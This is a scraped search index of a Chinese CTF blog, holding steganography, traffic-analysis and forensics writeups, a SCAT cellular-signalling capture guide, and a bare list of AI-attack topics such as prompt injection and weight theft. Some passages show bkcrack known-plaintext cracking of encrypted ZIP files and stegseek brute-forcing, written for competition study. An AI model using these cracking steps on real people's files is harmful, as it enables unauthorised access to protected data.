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","date":"2025-10-29","objectID":"/posts/02298dd/:0:0","tags":["Misc","Writeup","CTF"],"title":"2025 华为杯中国研究生网络安全创新大赛实网对抗赛 EZ_ATEXEC 详解","uri":"/posts/02298dd/"},{"categories":["Writeup"],"content":"2025 振兴杯网络安全大赛 Misc Writeup 题目名称 checkin 附件给了一个 txt 文件，里面都是二进制字符串，CyberChef 一把梭了 flag{730b3805-f606-8faa-6e3d-768453b53b94} 题目名称 go 附件给了下面这张图片，发现 flag 若隐若现的就在图里，但是经过了某种变换 感觉是考察选手 PS 的功底，我 PS 水平一般，就只能一圈一圈的画圆然后手搓旋转的角度了 flag{M@g1c_0f_Code} 如果有 PS 大佬知道更快速的做法，也欢迎分享一下，每个同心圆的间距是一样的，因此猜测 PS 肯定有更便捷的做法 题目名称 Magic 附件给了下面这张 PNG 图片 zsteg 扫一下可以得到：th1sisn0tp4ssw0rd stegsolve 中翻看了一下发现 RGB 的 Plane1 有明显的隐写痕迹 用 stegsolve 提取可以得到一个加密的 rar 压缩包，解压密码就是之前得到的：th1sisn0tp4ssw0rd 解压 rar 压缩包后可以得到下面这张 JPG 图片 本人以前也没遇到过这种，和别的师傅交流后知道了是Stereogram(立体图) 在 stegsolve 里用Stereogram Solver(立体视图)查看，发现偏移量为 171 时可以得到 flag flag{th1s_is_s0sos0_34sy} ","date":"2025-10-25","objectID":"/posts/16c4937/:0:0","tags":["Misc","Writeup","CTF"],"title":"2025 振兴杯江西省网络安全大赛 Misc Writeup","uri":"/posts/16c4937/"},{"categories":["CTF"],"content":"其实一直都挺想学一点 AI 安全的，只不过一直被搁置 提示词注入攻击 模型反演攻击 模型对抗样本攻击 模型权重窃取攻击 人工智能算法设计 模型漏洞利用 模型数据投毒攻击 ","date":"2025-10-17","objectID":"/posts/c5bc8a2/:0:0","tags":["CTF","Misc"],"title":"Misc-AI安全","uri":"/posts/c5bc8a2/"},{"categories":["Writeup"],"content":"2025 第九届工业信息安全技能大赛-典型工业场景锦标赛 Writeup 赛后有师傅来问这场比赛里的题，部分题目出的挺好的，有一定的难度，于是打算记录一下 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 开局一张图 LSB 隐写，提取出来即可：0fvx2enlh9k6ai4el2g960dd97c2f4805987fl3Aw4bZ0FGKJ2k6EDBqoYCiTWr8RXQdleg 题目名称 设计图之秘 steghide 隐写，直接用 stegseek 爆破密钥即可 打开 .out 文件即可得到：flk5lsdiaenorfa1yeag7d21c78ad28c3ae25V6swgqhSAc3eyHJoQzMWFr491xktO8dGYRTXmCiPZNufBpl7b2UDK0Larm 题目名称 抓内鬼啦 题目附件给了一个流量包，打开发现 HTTP 流量中上传了几个文件 首先是传了了一张宽高被篡改过的 PNG 图片，并且图片末尾有段 base64，解码后可以得到宽高的提示 010 打开修改好宽高后可以得到一张二维码 扫码即可得到第一段的 flag: Polis{W0w_Th1s_1s_f1agO1_ 然后流量中还传了一个 zip 压缩包，尝试提取出来，发现是伪加密的 010 打开发现压缩大小和压缩前大小也被篡改了，修改为正确的大小并去除伪加密后打开 即可得到第二段 flag: Great_G0t_it!} 综上，最后的 flag 为：Polis{W0w_Th1s_1s_f1agO1_Great_G0t_it!} 题目名称 固件分析 1 题目附件给了一个 img 文件，尝试直接用 DiskGenius 打开 可以得到上面这几个文件，其中 7z 压缩包是加密的 尝试直接 strings 一下 sh 和 motd 里面的内容，可以得到第一段 flag 和压缩包的解压密码：Secret_PLC2025 解压后可以得到一个 flag2.txt，内容如下： E4MC01MGE4LTRm 但是发现拼不出完整的 flag，于是尝试直接 strings 整个 img，可以得到另外几段内容 最后尝试在 CyberChef 中组合一下，把三段 base64 调整到相同的长度，然后解码即可得到完整的 flag flag{a6300a80-50a8-4f3f-b339-3ac9c76ae902} 题目名称 工控宣传的隐秘信号 附件给了一个 mp3 文件和一个加密的压缩包，直接用 audacity 倒放即可听到压缩包的解压密码：s0803y0518 解压后可以得到一张 GIF，尝试分帧，可在第 156 帧得到一个少了定位块的二维码 补上定位块后扫码即可得到：GNalVNrhVOLZjRK7pMrJjPn3x 然后随波逐流解个 XXencode 即可得到最后的 flag: flag{aiyoubucuoo1} 题目名称 工业日志分析 附件给了一个 log 文件，直接 vscode 打开然后在里面找三段 base64 然后 CyberChef 组合一下解 base64 即可得到最后的 flag：flag{4e54fa7c-c530-4c5c-985e-2e15871ddf04} 题目名称 工业控制协议流量分析 1 题目附件给了一个流量包，打开发现主要是 TCP 流量，首先尝试用以下命令导出一下传输的数据 tshark -r 工业控制协议流量分析1.pcap -T fields -Y 'tcp' -e 'tcp.segment_data' \u003e out.txt 发现大多数数据的长度都是 13 字节，有少部分不是，因此我们重点关注这些长度不为 13 字节的数据 用以下命令导出一下长度不为 13 字节的数据 tshark -r 工业控制协议流量分析1.pcap -T fields -Y 'len(tcp.segment_data) != 13' -e 'tcp.segment_data' \u003e out.txt 可以得到如下内容： 6e310000000901666c0304cdd0141e 0a400000000901030461677b399dde,e50e 187a00000009013437316603045f10,8121 792d000000096433322d010304bc9a,b5b0 224600000009010361353832042917,411e 5da500000009010304a42d3438c4e9,22 7b2800000009013834030445c76c42 5f92000000090103042d6239da0959,97 956500000009010304d82b39302db8,9e 073800000009010304b631306666a5,94 cc6d0000000901030446903963380d,e4 57960000006563090103045d644a1a 3b6c00000009010304d86438300785,87 8f4200000009010304c9307dbeea4f 拿 CyberChef 解一下 Hex 已经能看到部分 flag 了 手动把不可打印字符和大写字符删去，即可得到最后的 flag：flag{9471fd32-a582-4884-b990-10ff9c8dd800} 题目名称 工业控制协议流量分析 2 附件给了一个流量包，打开翻看发现主要是 TPKT 协议 尝试用 tshark 导出 tpkt.continuation_data tshark -r 工业控制协议流量分析2.pcap -T fields -Y '_ws.col.protocol == \"TPKT\"' -e tpkt.continuation_data \u003e out.txt 发现用很多数据是相同的，然后其中穿插了几个不同的数据，因此我们可以过滤一下再导出 tshark -r 工业控制协议流量分析2.pcap -T fields -Y '!(tpkt.continuation_data == 4d:4d:53:5f:50:41:59:4c:4f:41:44:5f:4e:4f:52:4d:41:4c)' -e tpkt.continuation_data \u003e out.txt 第一行数据解 Hex 可以得到一串密码 然后我们主要观察剩下数据的倒数第二字节，可以发现有个 zip 压缩包 但是提取出来发现文件是不完整的，于是我们尝试用以下这个命令直接去提取 TCP 中的数据 tshark -r 工业控制协议流量分析2.pcap -T fields -Y '!(tcp.payload == 4d:4d:53:5f:50:41:59:4c:4f:41:44:5f:4e:4f:52:4d:41:4c)' -e tcp.payload \u003e out.txt 这个时候提取出来的 zip 数据就是完整的了，用MMS12345作为密码解压即可得到最后的 flag flag{6a46756d-df7e-4b66-87e4-1b2661676e40} 题目名称 工业控制协议流量分析 3 附件给了一个流量包，打开发现存在 mqtt 流量，直接用以下命令导出 mqtt.msg tshark -r protocal.pcapng -T fields -Y 'mqtt' -e 'mqtt.msg' \u003e out.txt 然后 CyberChef 转一下 Hex ，拉倒末尾即可看到 flag：flag{ruEf6OmqhAlXIYxmnR1XLC6R1]} 题目名称 音频隐写 附件给了一个 字符频率映射表.txt 还有一个 wav 文件，映射表中的内容如下： 'a': 440, 'b': 466, 'c': 494, 'd': 523, 'e': 554, 'f': 587, 'g': 622, 'h': 659, 'i': 698, 'j': 740, 'k': 784, 'l': 830, 'm': 880, 'n': 932, 'o': 988, 'p': 1047, 'q': 1109, 'r': 1175, 's': 1245, 't': 1319, 'u': 1397, 'v': 1480, 'w': 1568, 'x': 1661, 'y': 1760, 'z': 1865, '1': 1000, '2': 2000, '3': 3000, '4': 4000, '5': 5000, '6': 6000, '7': 7000, '8': 8000, '9': 9000, '0': 10000, 'A': 445, 'B': 471, 'C': 499, 'D': 528, 'E': 559, 'F': 592, 'G': 627, 'H': 664, 'I': 703, 'J': 745, 'K': 789, 'L': 835, 'M': 885, 'N': 937, 'O': 993, 'P': 1052, 'Q': 1114, 'R': 1180, 'S': 1250, 'T': 1324, 'U': 1402, 'V': 1485, 'W': 1573, 'X': 1666, 'Y': 1765, 'Z': 1870, 因此我们写个脚本提取一下即可得到 flag: FvoelrnoBjmFz1aknoF7U24gFe5204521Be19B3voh9BSaqhGRlyXio6m0xtkEZ21nUmhelP import numpy as ","date":"2025-10-14","objectID":"/posts/49bdad5/:0:0","tags":["CTF","Misc","Writeup"],"title":"2025 第九届工业信息安全技能大赛-典型工业场景锦标赛 Misc Writeup","uri":"/posts/49bdad5/"},{"categories":["Writeup"],"content":"作为 BUPT 的新生，当然不能错过一年一届的 TSCTF-J，于是上号打了一下（虽然有点老登炸鱼的嫌疑 自从大一那时候的校赛后，就没尝试过一个人打全方向的题了 也算是一种复健运动吧，找找当初刚学 CTF 时那种热血的感觉 Misc 题目名称 卢森堡的秘密 题目附件给了一张 PNG 图片，zsteg 一把梭了 TSCTF-J{Th3_sEcre7_0f_L$B!} 题目名称 Meow（一血） 题目附件给了一个 docx 文件，直接打开可以得到如下内容 改后缀为.zip，然后解压并打开可以得到如下提示：换了个base64的表 因此写个脚本解 base64 ，然后手动组合一下即可：`` import base64 from itertools import permutations custom_b64_alphabet = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/\" std_b64_alphabet = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\" def custom_b64decode(s): trans = str.maketrans(custom_b64_alphabet, std_b64_alphabet) s = s.translate(trans) missing_padding = len(s) % 4 if missing_padding: s += '=' * (4 - missing_padding) return base64.b64decode(s) lines = [ \"vfndveyTsNSk\", \"mv9bBq==\", \"x01LB3Dnztb3\", \"xZrFq2fu\", \"iseHFq==\" ] for line in lines: print(custom_b64decode(line)) # TSCTF-J{1_Am_4_CaT_MeowMe0w!!!} 题目名称 EzFix（一血） 题目附件给了一个Vmware虚拟机的虚拟磁盘镜像目录，我们主要关注 vmdk 文件 直接用 DiskGenius 挂载，在 TSCTF-J 用户的桌面上可以看到一个加密的压缩包和一个 PNG 图片 打开压缩包，Store+ZipCrypto 很明显提示了明文攻击 我们用 bkcrack 利用 PNG 文件头进行明文攻击即可 echo 89504E470D0A1A0A0000000D49484452 | xxd -r -ps \u003e png_header bkcrack -C flag_part2.zip -c useless.png -p png_header -o 0 bkcrack -C flag_part2.zip -c useless.png -k e9ac551e 24d21c15 097eb913 -U out.zip 123 用密码123解压即可得到第二段 flag：9ood_4t_B50D!!!Wdf9u} 第一段 flag 直接 strings 就行（感觉可能是非预期 综上，最后的 flag：TSCTF-J{w0w_Y0u_4rE_9ood_4t_B50D!!!Wdf9u} 题目名称 秃头！真是！太棒啦！（一血） 题面信息如下： 你的头发有什么用？快将这种没用的东西统统拿掉！让我看到最干净的你！ 请构建一个不超过100字节的ELF程序，使之可以输出字符串“秃头！真是！太棒啦！”。 你可以使用附件中的solve.py协助你与服务器交互。 并且题目给了如下提示： 目标字符串：b’\\xe7\\xa7\\x83\\xe5\\xa4\\xb4\\xef\\xbc\\x81\\xe7\\x9c\\x9f\\xe6\\x98\\xaf\\xef\\xbc\\x81\\xe5\\xa4\\xaa\\xe6\\xa3\\x92\\xe5\\x95\\xa6\\xef\\xbc\\x81' 网上找到了参考的汇编代码：https://gist.github.com/antsaasma/2578795 只不过它输出的是Hello world BITS 32 org 0x00010000 db 0x7F, \"ELF\" ; e_ident dd 1 ; p_type dd 0 ; p_offset dd $$ ; p_vaddr dw 2 ; e_type ; p_paddr dw 3 ; e_machine dd _start ; e_version ; p_filesz dd _start ; e_entry ; p_memsz dd 4 ; e_phoff ; p_flags _cont: mov dl, string_len ; e_shoff ; p_align int 0x80 mov al, 1 ; e_flags xor bl,bl int 0x80 ; e_ehsize dw 0x20 ; e_phentsize dw 1 ; e_phnum _start: mov al, 04 ; e_shentsize mov bl, 01 ; e_shnum mov ecx, string_start ; e_shstrndx jmp _cont string_start: db \"Hello world\", 0x0a string_len equ $ - string_start filesize equ $ - $$ 对照上面的代码，修改一下然后编译即可 BITS 32 org 0x00010000 db 0x7F, \"ELF\" ; e_ident dd 1 ; p_type dd 0 ; p_offset dd $$ ; p_vaddr dw 2 ; e_type dw 3 ; e_machine dd _start ; e_version dd _start ; e_entry dd 4 ; e_phoff _cont: mov dl, string_len ; e_shoff int 0x80 mov al, 1 ; e_flags xor ebx, ebx int 0x80 ; e_ehsize dw 0x20 ; e_phentsize dw 1 ; e_phnum _start: mov al, 4 ; e_shentsize mov bl, 1 ; e_shnum mov ecx, string_start ; e_shstrndx jmp _cont string_start: db 0xe7,0xa7,0x83,0xe5,0xa4,0xb4,0xef,0xbc,0x81,0xe7,0x9c,0x9f,0xe6,0x98,0xaf,0xef,0xbc,0x81,0xe5,0xa4,0xaa,0xe6,0xa3,0x92,0xe5,0x95,0xa6,0xef,0xbc,0x81, 0x0a string_len equ $ - string_start filesize equ $ - $$ nasm -f bin -o test.elf test.asm from pwn import * p = remote('127.0.0.1', 49345) f = open('test.elf', 'rb') content = f.read() f.close() print(f\"ELF 文件大小: {len(content)} 字节\") p.recvuntil('“秃头！真是！太棒啦！”\\n'.encode()) p.send(content) p.interactive() 题目名称 BadFile（一血） 题面信息如下： 在附件的每个文件夹内各有100份文件，其中各有5份存在隐私泄露或恶意代码，请你找出这15份文件，按照txt,wav,pdf的文件类型顺序，将文件名（带后缀）按照字典序用_连接后计算md5值，并使用TSCTF-J{}包裹后提交。 对于 txt 文件，100 个完全可以手动一个个查看，基本上就是手机号、地址、身份证号这些 对于 PDF 文件，我们可以用以下命令转为 txt 文件，然后按照大小降序排列 mkdir -p txt \u0026\u0026 for f in *.pdf; do strings \"$f\" \u003e \"txt/${f%.pdf}.txt\"; done 然后就能看到 XSS 注入的恶意代码 对于 wav 文件，先按大小排列能找出四个，剩下的最后一个语音转文字一个个看就行 import os import whisper model = whisper.load_model(\"base\") filelist = os.listdir('wav') # print(filelist) for filename in filelist: filepath = './wav/' + filename result = model.transcribe(filepath, language='zh') print(filepath,result[\"text\"]) 最后找出来的文件是下面代码里这几个，写个脚本排序然后算一下 MD5 即可 import hashlib txtfile = \"3WQlwSaj.txt dubZ3AZn.txt nhlbNxGL.txt qtFyaGkZ.txt wlBUCOeg.txt\".split() wavfile = \"2JuiKL42.wav 4UjLqeRF","date":"2025-10-14","objectID":"/posts/443835e/:0:0","tags":["CTF","Writeup"],"title":"2025 TSCTF-J Writeup","uri":"/posts/443835e/"},{"categories":["Research"],"content":"之前复现论文，做实验的时候想要实时查看 LTE 和 NR 的信令消息，只能通过 CelllularPro 但是无奈这个软件是收费的，并且很多论文作者在实时捕获消息上并没有提到这个软件 反而都是用 SCAT 这个开源项目进行实时捕获，因此打算写篇博客来记录一下配置过程 项目地址：https://github.com/fgsect/scat 参考链接： https://github.com/fgsect/scat/issues/111 https://www.youtube.com/watch?v=3eATjQASLLA\u0026t=263s https://github.com/arifkyi/5GLuafile https://www.youtube.com/watch?v=b0dbvIkkgCI 参考项目的 README 文档，SCAT 的安装可以直接用 pip install 完成 pip install \"signalcat[fastcrc]\" 然后手机用 USB线连上主机，并用 adb 打开诊断端口，输入以下命令启动 SCAT 即可 scat -t qc -u -a 000:001 -i 0 # -t 指定基带的品牌，qc 是高通，sec是三星，hisi是海思 # -u USB 模式（直接连接手机） # -s /dev/ttyUSB0 # 串口模式（连接蜂窝模块） # -d filename # 文件模式（分析已有的诊断日志文件） # -a 000:001 指定 USB 设备地址 总线号:设备号 # -i 指定诊断端口号，这个的数值与手机具体型号有关，可用 lsusb 命令查看，参考上面那个 youtube 视频 # -v 详细输出 # 当然也可以用下面命令把捕获到的消息转发到 127.0.0.2（虽然我感觉没啥必要 scat -t qc -u -a 000:001 -i 0 -H 127.0.0.2 如果不知道诊断端口的序号，可以使用 lsusb 命令查看： sudo apt install usbutils lsusb -v 终端输入上面的命令后，SCAT正常运行的输出如下： 这时候我们打开 wireshark 监听本地回环地址lo0即可 如果之前的步骤一切正常，这时候我们就能看到实时捕获到的 LTE 信令了 然后我们可以用下面这个过滤器来过滤一下，会看的更清楚一些 (((((!(_ws.col.protocol == \"TCP\")) \u0026\u0026 !(_ws.col.protocol == \"ICMP\")) \u0026\u0026 !(_ws.col.protocol == \"HTTP\")) \u0026\u0026 !(_ws.col.protocol == \"HTTP/JSON\")) \u0026\u0026 !(_ws.col.protocol == \"UDP\")) \u0026\u0026 !(_ws.col.protocol == \"MDNS\") SCAT 除了能实时捕获 4G-LTE 的消息，也支持实时捕获5G-NR消息，效果如下: Tips: 如果 UE 捕获不到消息并且终端里没有响应，可尝试重启手机，高通的基带时常会遇到这个问题 因为 wireshark 本身是不支持解析 GSMTAPv3 协议数据的，我们需要手动加入 lua 脚本来提供支持 SCAT 项目本身提供了解析 GSMTAPv3 协议数据的 lua 插件，但是好像还是不够完善 国外有个老哥重新写了一个，这个可能更好用：5GLuafile 成功加载 lua 插件后再进行监听的效果如下： Tips：可以点击左上角的 Wireshark -\u003e 关于 wireshark -\u003e 文件夹 -\u003e 个人 lua 插件 找到 lua 插件的目录 然后把 lua 脚本复制到这个目录下即可 然后我们可以比较一下 wireshark 里抓的消息和 CellularPro 里的消息 如果启用了 lua 插件后，4G-LTE的消息无法正常解析，可以按如下设置： wireshark -\u003e 分析 -\u003e 解码为 -\u003e UDP port设置为4729 -\u003e 把当前设置为 GSMTAP 如果要切换为解码 5G-NR的消息，把当前设置为GSMTAPv3 即可 ","date":"2025-09-25","objectID":"/posts/a8aa439/:0:0","tags":["Research"],"title":"利用 SCAT 实时捕获 4G-LTE 和 5G-NR 层三以上消息","uri":"/posts/a8aa439/"},{"categories":["Writeup"],"content":"群里有很多师傅在问这个比赛的Misc题，就打算专门写一篇博客记录一下 个人感觉这场比赛的Misc题出的还是可以的，出题人水平也在线，然后Misc附件还是动态的 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 神秘的图片 题目附件给了一张 ctf.png，010打开发现图片末尾有一个文件头被篡改了的ZIP压缩包 补上文件头后打开，发现需要crc32爆破，猜测爆破出来的值就是压缩包的解压密码 用hel1o_vigEneRe_here2作为解压密码去解压可以得到那个data文件，010打开查看发现是一堆十六进制数据 看前几个十六进制，发现是逆序的PNG的文件尾，因此我们拿CyberChef转一下 发现PNG的文件头被篡改了，问题不大，我们下载下来用010手动修复一下 修复文件头后发现图片还是没法正常显示，010的模板也有显示报错 仔细观察发现部分IDAT块的长度被篡改了，并且结合U2Fs这几个字符，猜测还藏了加密后的密文 因此我们写个脚本提取一下IDAT长度，并解码一下十六进制 import re with open(\"data\",'r') as f: data = f.read()[::-1] # print(data[:100]) find_list = re.findall(r\"(.{8})49444154\",data) for item in find_list: print(item) 删除干扰的数据后得到的密文为：U2FsdGVkX1+hrSabjmOfsFMTX/rQUZjwT6p6N+yHV4acgx+utA3D22I3s/Mg6BrgNOhR6s/7 然后我们参考010模板中正常的IDAT块长度，逐个修改一下错误的IDAT块 这里要注意开头和末尾的IDAT块的长度不一定是 65524 修复完后即可得到下图，发现有密钥 W87aETbAN，并且图片的内容提示了rabbit加密 rabbit解密后即可得到：fheg{2b5je1145x3218j6b8y4i4dah9c655xi} 结合之前得到到内容，猜测还有一层维吉尼亚加密，可以结合我博客里的维吉尼亚对照表和flag开头的flag{ 逆推一下密钥即可得到最后的flag: flag{2f5fe1145b3218f6b8c4e4ded9c655be} 当然线下赛如果断网，CyberChef也能解 题目名称 war 题目附件给了一张war.png，010打开发现末尾有个被篡改了的ZIP压缩包 提取出来手动修复一下文件头和文件尾，并修改一下目录区的长度 修复好后010的模板就不报错了，但是发现压缩包是加密的，因此我们需要去寻找解压密码 stegsolve打开发现图片 plane 7 存在隐写 提取后可以得到：autokey RPYJVMJQ 发现是autokey加密，我们拿到了密钥，但是没有密文，因此我们需要去寻找密文 用PS打开这张PNG，发现除了第一行的隐写以外，第二行的白色像素也很可疑 后来和别的师傅交流了一下，知道了隐写的具体思路，我个人感觉挺难想到的，横坐标逐位做差，然后再逐位异或 from PIL import Image img = Image.open(\"war.png\") w,h = img.size res = [] for y in range(1,2): for x in range(w): pixel = img.getpixel((x,y)) if pixel == (255,255,255,255): res.append(x) print(res) tmp = [] for i in range(1,len(res)): tmp.append(res[i]-res[i-1]) print(tmp) for i in range(1,len(tmp)): print(chr(tmp[i] ^ tmp[i-1]),end=\"\") # KWCYVEBMHYHXSOYCAWSCTBEFTOKVW 得到密文后用之前的密钥解个autokey即可得到压缩包的解压密码：WGGMFPUBFYZHJVBV 用 WGGMFPUBFYZHJVBV 作为解压密码解压即可得到最后的flag: flag{rPF5n4nRy7q43hf5RApe34UqWnq2hSAK} 题目名称 动听的音乐 题目附件给了一个challenge.wav还有一张hint.bmp 先用zsteg扫一下bmp图片，可以看到隐写了一个ZIP压缩包的十六进制数据 用以下命令提取一下十六进制值，然后再转一下即可得到一个压缩包 zsteg -e b1,rgb,lsb,xy hint.bmp \u003e out.bin 解压压缩包可以得到一个hint.txt，内容如下： 既然你能注意到这里，那我就给你点提示吧。 1.音频LSB隐写 2.左右声道单独分析 3.AES-ECB解密 因此我们先用Audacity分离一下两个声道到单个wav文件，然后再写个脚本提取一下隐写的数据 import wave import libnum def extract_wav_lsb(wav_file): wav = wave.open(wav_file, 'r') # 读取前1000帧的音频数据并将其转换为十六进制字符串 # readframes()返回的是字节数据，.hex()将其转换为十六进制表示 frames_data = wav.readframes(1000).hex() res = '' # 遍历十六进制数据，每次处理4个字符(2字节) # 因为WAV文件通常使用16位(2字节)采样 for i in range(0, len(frames_data), 4): data = frames_data[i:i+4] # 将数据从小端序转换为大端序，因为WAV文件使用小端序存储数据 data_rev = int(data[2:] + data[:2], 16) # 使用位与运算(\u0026)获取最低有效位(LSB) res += str(data_rev \u0026 1) print(libnum.b2s(res)) if __name__ == \"__main__\": extract_wav_lsb('1.wav') extract_wav_lsb('2.wav') # b'MySuperSecretKey!\\r]o^\\x9e\\xbd\\x8a\\x080\\x83J\\xcb\\xcd.\\xb0\\xb9\\x8fn\\x87\\xe3\\x1f\\xfb\\xa5.\\x0e\\xfe\\xd45\\x1d\\xf7\\xe7}\\xc2\\x8cU\\xa1O\\xbeS,\\xf6\\xf1\\x1a\\x14!\\x08C\\x0e2\\x1aR\\x94\\x86\\x1a[R\\xe7\\xb9H!J\\xd4\\xe7\\xf5\\xff\\r\\xbc\\xa1)\\x84$7\\x1a\\x88\\xc9\\xbeFS\\xac\\x00\\x89j\\x84\\xa5\\x04\\x15\\x08\\xde?\\xf7h\\x00\\x862\\xb8\\xef\\xfe\\x00\\x858\\xd2G\\xa8B\\xa0\\x84@%' # b'q8TTfmlBwyT1QPLiZS9ixWKzS5h7aYgOUlaxNMJmE763AIoZ66FRHXFeYYWZBbLn\\xces\\x9a\\xf6:P3\\xdc\\xea\\xe28\\xb8\\x86\\xe0Z\\xc7\\x19\\x12\\x93\\x15K\\x1c\\xe2\\x94=B\\x1f\\xa4\\x13\\x158j9Ot\\xa0:_?\\xbf\\xad\\xb3\\\\z\\xb5\\xac\\xb7\\x88[\\x1a\\xe7\\xfd]\\r\\xf7\\xad(\\xd4\\x95\\x10J' 得到密文：q8TTfmlBwyT1QPLiZS9ixWKzS5h7aYgOUlaxNMJmE763AIoZ66FRHXFeYYWZBbLn 和密钥：MySuperSecretKey! 最后将密钥转为 hex，并在后面 Padding \\x00 到 32 字节：4d7953757065725365637265744b657921000000000000000000000000000000 最后解个 AES-ECB 即可得到最后的 flag：flag{e394ed9b9c4b24e0fc0f1e6897bdf938} 除此之外，用随波逐流把 AES 密钥的长度改为 256（32x8）位一样可以解出来 其实之前也有遇到过这种在末尾 padding \\x00 的情况，然后有在线网站和工具可以自动完成这个操作 但是为啥在线网站和工具遇到这题就解不出来了呢？ 因为密钥长度是 17 字节，网站和工具可能默认 padding 到 24 字节(192 位)了，而不是 32 字节 所以我个人感觉出题人这里没出好，要么密钥长度就给刚刚好（16/24/32 字节），要么就让密钥长度超过 24 字节 题目名称 Scrambled_Base 题目附件给了一个 txt 文件，内容如下： CLJZMY3TCLJVMEYDMM,MZWGCZ33GA3WENRSGI,RQGE3DONDFG56Q====,3TCLJVGMYDILJUMEZD 看到连续的四个=，猜测可能是 base32，直接写个脚本爆破一下排列顺序，然后解 Base32 即可 import base64 import itertools base_part = \"CLJZMY3TCLJVMEYDMM,MZWGCZ33GA3WENRSGI,RQGE3DONDFG56Q====,3TCLJVGMYDILJUMEZD\".","date":"2025-09-23","objectID":"/posts/58b2135/:0:0","tags":["CTF","Misc","Writeup"],"title":"2025 泰山杯线下决赛 Misc Writeup","uri":"/posts/58b2135/"},{"categories":["CTF"],"content":"This is a simple summary of digital forensics . 常见的非预期 取证题如果出题人不够谨慎，很容易出现非预期 因此做取证题前可以尝试在 010 或者 Linux 直接搜索关键字符串，比如下面这行 strings mem.raw | grep 'flag{' # 如果是 Windows 的话可以用下面这个命令，因为 Windows 下的默认字符集是 utf16-le strings -e l memory.dmp | grep 'flag{' 另一种非预期就是直接把进程导出，然后用 GIMP 直接调出屏幕上的内容 使用的系统和环境 #Win11-WSL-Ubuntu 这个系统下面vol2和vol3都下载了 直接在终端输入vol.py或者vol3.py即可 #Vmware-Kali 这个系统下面只安装了vol2 输入vol.py即可使用 获取Hash值 #获取sha1 sha1sum filename #h获取MD5 md5sum filename 内存取证 常见文件后缀：.vmem / .dump / .raw / .img 内存取证除了常用的 Vol 以外，也可以尝试一下 R-Stdio 这个工具，提取文件的时候不一定哪个可以用 打开 R-Stdio -\u003e 驱动器 -\u003e 打开镜像 -\u003e 扫描 拿到内存镜像后也可以先用PasswareKit先扫描一下密码 vol.py –info 可以查看插件 #官方WIKI https://github.com/volatilityfoundation/volatility/wiki #点击右侧的Command References来查看具体参数的用法 Windows内存取证 不是Windows10的内存镜像的话可以直接用 Vol_all_in_one 一键分析 取证过程中一定要记得查看镜像桌面上的文件！ Volatility2 # 识别操作系统的基本信息 vol.py mem.dump imageinfo # 查看进程 vol.py -f OtterCTF.vmem --profile=Win7SP1x64 pslist # 